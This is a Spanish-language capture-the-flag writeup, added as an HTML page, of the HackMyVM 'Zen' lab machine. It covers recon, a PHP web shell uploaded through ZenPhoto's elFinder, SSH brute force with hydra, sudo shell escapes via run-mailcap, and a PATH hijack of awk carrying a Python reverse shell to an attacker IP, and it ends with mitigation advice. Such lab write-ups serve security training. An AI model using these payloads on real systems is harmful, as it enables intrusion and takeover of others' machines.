@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Writeup de la máquina Zen de HackMyVM — Antoni Muñoz.">
+  <title>Zen — Writeup HackMyVM</title>
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+  <a class="skip-link" href="#main">Saltar al contenido</a>
+
+  <header class="site-header">
+    <nav class="nav container" aria-label="Navegación principal">
+      <a class="brand" href="../index.html">
+        <span class="brand__prompt" aria-hidden="true">~$</span> antoni<span class="accent">.sec</span>
+      </a>
+      <button class="nav__toggle" aria-expanded="false" aria-controls="nav-menu">
+        <span class="nav__toggle-bar" aria-hidden="true"></span>
+        <span class="visually-hidden">Abrir menú</span>
+      </button>
+      <ul class="nav__menu" id="nav-menu">
+        <li><a href="../index.html">Inicio</a></li>
+        <li><a href="index.html" aria-current="page">Writeups</a></li>
+        <li><a href="../contacto/index.html">Contacto</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main id="main">
+    <div class="writeup-top container">
+      <a class="writeup-top__back" href="index.html">← Writeups</a>
+    </div>
+    <article class="prose container">
+    <h1>Writeup: Máquina Zen - HackMyVM</h1>
+    <p>En este writeup rootearemos la máquina <strong>Zen</strong> de la plataforma HackMyVM. El acceso inicial será sencillo a través de una contraseña débil oculta en el <code>robots.txt</code>, mientras que la escalada de privilegios constará de una cadena de tres pivoteos laterales mediante sudo mal configurado y un secuestro del PATH para alcanzar root.</p>
+    <h2>Reconocimiento Inicial</h2>
+    <p>Vamos con <code>nmap</code> para descubrir puertos abiertos con servicios expuestos:</p>
+    <pre><code class="language-bash">$&gt; nmap -p- --open -sSCV -n -Pn 192.168.0.30 -oN tcpScan
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 c3:a0:ac:5d:25:92:47:2c:f5:70:ba:1b:f0:a3:b9:67 (RSA)
+|   256 03:72:ad:7b:df:46:5d:b3:2a:9b:69:a9:c4:11:35:86 (ECDSA)
+|_  256 4b:a1:81:88:73:2a:a0:b6:5c:9f:30:d9:c9:7f:1f:3f (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-title: Galería
+| http-robots.txt: 9 disallowed entries 
+| /albums/ /plugins/ /P@ssw0rd /themes/ /zp-core/ 
+|_/zp-data/ /page/search/ /uploaded/ /backup/
+|_http-server-header: nginx/1.14.2
+</code></pre>
+    <p>El escaneo nos revela dos puertos abiertos: SSH (22) y HTTP (80). Vemos varias rutas internas deshabilitadas en el <code>robots.txt</code>, incluyendo una bastante sospechosa: <code>/P@ssw0rd</code>.</p>
+    <p>Al visitar la web en el navegador confirmo el uso de ZenPhoto como gestor de contenidos. Inspeccionando el código fuente con <code>Ctrl+U</code> puedo ver la versión exacta: <strong>ZenPhoto 1.5.7</strong>. Existen vulnerabilidades para esta versión, pero necesitamos estar autenticados. </p>
+    <p>Pruebo ahora con los directorios revelados por el <code>robots.txt</code>, y todos devuelven <code>403 Forbidden</code> excepto dos:</p>
+    <ul>
+    <li><code>/P@ssw0rd</code> → <code>404 Not Found</code></li>
+    <li><code>/zp-core</code> → accesible</li>
+    </ul>
+    <p>El hecho de que <code>/P@ssw0rd</code> devuelva 404 en lugar de un 403 es bastante raro, la ruta no existe como directorio real pero está deshabilitada?</p>
+    <p>Antes de nada vamos a completar la enumeración, fuzzeamos el directorio <code>/zp-core/</code>:</p>
+    <pre><code class="language-bash">$&gt; gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.30/zp-core/ -x txt,php -r
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+admin.php            (Status: 200) [Size: 7779]
+license.php          (Status: 200) [Size: 3865]
+setup.php            (Status: 200) [Size: 1651]
+htaccess             (Status: 200) [Size: 624]
+===============================================================
+Finished
+===============================================================
+</code></pre>
+    <p>Quitando los resultados con 0 caracteres y status code 4xx/5xx hemos descubierto 4 rutas a investigar. Solamente es de interés <code>admin.php</code>, que es el panel de autenticación del CMS. Probamos credenciales básicas como admin:admin, admin:password,... pero nada. </p>
+    <h2>Acceso inicial</h2>
+    <p>Antes nos ha llamado la atención que <code>/P@ssw0rd</code> era la única ruta del robots.txt que nos devolvía status code 404, vamos a probarlo como contraseña también... y voilà. Las credenciales <code>admin:P@ssw0rd</code> son válidas para el panel de administración de ZenPhoto.</p>
+    <p>Estamos autenticados y, como hemos dicho antes, sabemos que existen vulnerabilidades de arbitrary file upload. Un poco de investigación en internet nos explica cómo explotar la vulnerabilidad: simplemente necesitamos activar el plugin 'elFinder', lo que nos permite subir un php malicioso en el apartado Themes.</p>
+    <pre><code class="language-php">&lt;?php system($_REQUEST['cmd']); ?&gt;
+</code></pre>
+    <p>Verificamos el RCE desde nuestra máquina:</p>
+    <pre><code class="language-bash">$&gt; curl -s http://192.168.0.30/themes/shell.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+    <p>Ya podemos lanzarnos una reverse shell, obteniendo acceso como <code>www-data</code> en la máquina objetivo.</p>
+    <h2>Escalada de Privilegios</h2>
+    <h3>a) de <code>www-data</code> a <code>zenmaster</code></h3>
+    <p>Enumero el sistema manualmente pero encuentro poca cosa. Hay tres usuarios con shell a parte de <code>root</code>:</p>
+    <pre><code class="language-bash">www-data@zen:~$ cat /etc/passwd | grep "sh$"
+root:x:0:0:root:/root:/bin/bash
+kodo:x:1000:1000:kodo,,,:/home/kodo:/bin/bash
+zenmaster:x:1001:1001:,,,:/home/zenmaster:/bin/bash
+hua:x:1002:1002:,,,:/home/hua:/bin/bash
+</code></pre>
+    <p>Hemos visto que la puerta de entrada ha sido el uso de credenciales débiles, quizá esta falla sea persistente. Al no encontrar nada en el sistema, vamos a probar un ataque de fuerza bruta contra SSH usando <code>hydra</code>. Creamos un archivo <code>users</code> con las líneas <code>kodo</code>, <code>zenmaster</code> y <code>hua</code>. Antes de usar un diccionario de contraseñas, para no hacer tanto ruido vamos a probar con el mismo archivo <code>users</code> como lista de contraseñas.</p>
+    <pre><code class="language-bash">hydra -L users -P users ssh://192.168.0.30
+</code></pre>
+    <p>En pocos segundos <code>hydra</code> encuentra las credenciales <code>zenmaster:zenmaster</code>. Accedemos por SSH y leemos la primera flag.</p>
+    <h3>b) de <code>zenmaster</code> a <code>kodo</code></h3>
+    <p>Veamos los privilegios de sudo:</p>
+    <pre><code class="language-bash">zenmaster@zen:~$ sudo -l
+User zenmaster may run the following commands on zen:
+    (kodo) NOPASSWD: /bin/bash
+</code></pre>
+    <p><code>zenmaster</code> puede ejecutar <code>/bin/bash</code> como el usuario <code>kodo</code> sin contraseña. Trivial:</p>
+    <pre><code class="language-bash">zenmaster@zen:~$ sudo -u kodo /bin/bash
+kodo@zen:~$
+</code></pre>
+    <h3>c) de <code>kodo</code> a <code>hua</code></h3>
+    <p>De nuevo miramos los permisos de sudo:</p>
+    <pre><code class="language-bash">kodo@zen:~$ sudo -l
+User kodo may run the following commands on zen:
+    (hua) NOPASSWD: /usr/bin/see
+
+kodo@zen:~$ ls -l /usr/bin/see
+lrwxrwxrwx 1 root root 11 Feb  9  2019 /usr/bin/see -&gt; run-mailcap
+</code></pre>
+    <p>El binario <code>/usr/bin/see</code> es un enlace simbólico a <code>run-mailcap</code>. Según GTFOBins, al igual que <code>vim</code> o <code>less</code>, <code>run-mailcap</code> permite ejecutar comandos desde el visor de archivos. Lo explotamos de la siguiente forma:</p>
+    <pre><code class="language-bash">kodo@zen:~$ sudo -u hua /usr/bin/see /etc/hostname # cualquier archivo sirve
+</code></pre>
+    <p>Después escribimos el comando de escape:</p>
+    <pre><code class="language-bash">!/bin/bash
+</code></pre>
+    <p>Lo que nos proporciona una shell como el usuario <code>hua</code>.</p>
+    <h3>d) de <code>hua</code> a <code>root</code></h3>
+    <p>De nuevo verificamos los privilegios de sudo de <code>hua</code>:</p>
+    <pre><code class="language-bash">hua@zen:~$ sudo -l
+User hua may run the following commands on zen:
+    (ALL : ALL) NOPASSWD: /usr/sbin/add-shell zen
+</code></pre>
+    <p><code>hua</code> puede ejecutar <code>/usr/sbin/add-shell zen</code> como cualquier usuario. Para entender qué hace internamente, lo analizamos con <code>strace</code> y enseguida llaman la atención las siguientes líneas:</p>
+    <pre><code class="language-bash">hua@zen:~$ strace /usr/sbin/add-shell zen
+...
+stat("/usr/local/sbin/awk", 0x7ffc3700cca0) = -1 ENOENT (No such file or directory)
+stat("/usr/local/bin/awk", 0x7ffc3700cca0) = -1 ENOENT (No such file or directory)
+stat("/usr/sbin/awk", 0x7ffc3700cca0)   = -1 ENOENT (No such file or directory)
+stat("/usr/bin/awk", {st_mode=S_IFREG|0755, st_size=674624, ...}) = 0
+...
+</code></pre>
+    <p>El binario busca <code>awk</code> en <code>/usr/local/sbin</code>, <code>/usr/local/bin</code> y <code>/usr/sbin</code> antes de encontrarlo en <code>/usr/bin</code>, lo que es coherente con el path (<code>awk</code> se invoca sin ruta absoluta):</p>
+    <pre><code class="language-bash">hua@zen:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</code></pre>
+    <p>Esto significa que podemos crear un archivo 'awk' en cualquiera de los tres primeros directorios que nos proporcione una shell. <code>hua</code> no tiene permisos de escritura en <code>/usr/local/sbin</code>, pero sí en <code>/usr/local/bin</code>, así que creamos aquí un script malicioso con una reverse shell en Python. Uso este payload de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey</a>:</p>
+    <pre><code class="language-bash">hua@zen:~$ echo 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.43\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"' &gt; /usr/local/bin/awk
+hua@zen:~$ chmod +x /usr/local/bin/awk
+</code></pre>
+    <p>Levantamos un listener en nuestra máquina atacante y ejecutamos el binario con privilegios:</p>
+    <pre><code class="language-bash"># Máquina atacante:
+nc -lvnp 1234
+
+# Máquina víctima:
+hua@zen:~$ sudo /usr/sbin/add-shell zen
+</code></pre>
+    <p>Así conseguimos finalmente la shell como <code>root</code> y obtenemos su flag.</p>
+    <h2>Detección y Mitigación</h2>
+    <ul>
+    <li>Credenciales ocultas en el <code>robots.txt</code> (<code>/P@ssw0rd</code>) — nunca incluir secretos en recursos accesibles sin autenticación</li>
+    <li>Contraseña débil y coincidente con el usuario (<code>admin:P@ssw0rd</code>, <code>zenmaster:zenmaster</code>) — exigir complejidad mínima y bloquear coincidencia usuario/contraseña</li>
+    <li>Plugin elFinder activo sin necesidad operativa — desactivarlo si no se usa; si se usa, bloquear la ejecución de scripts</li>
+    <li>Cadena de sudo sin contraseña de extremo a extremo (<code>zenmaster → kodo → hua → root</code>) — limitar las reglas de sudo a tareas operativas reales y revisarlas periódicamente</li>
+    <li>Shell escape vía <code>run-mailcap</code> (<code>/usr/bin/see</code>) — no delegar por sudo visores o paginadores interactivos, ya que equivale a delegar una shell completa</li>
+    <li>Resolución insegura de <code>awk</code> por PATH en <code>add-shell</code> — usar siempre rutas absolutas en scripts que se ejecutan con privilegios elevados</li>
+    </ul>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <p>Antoni Muñoz · Junior Pentester</p>
+      <p class="footer-inner__meta"></p>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
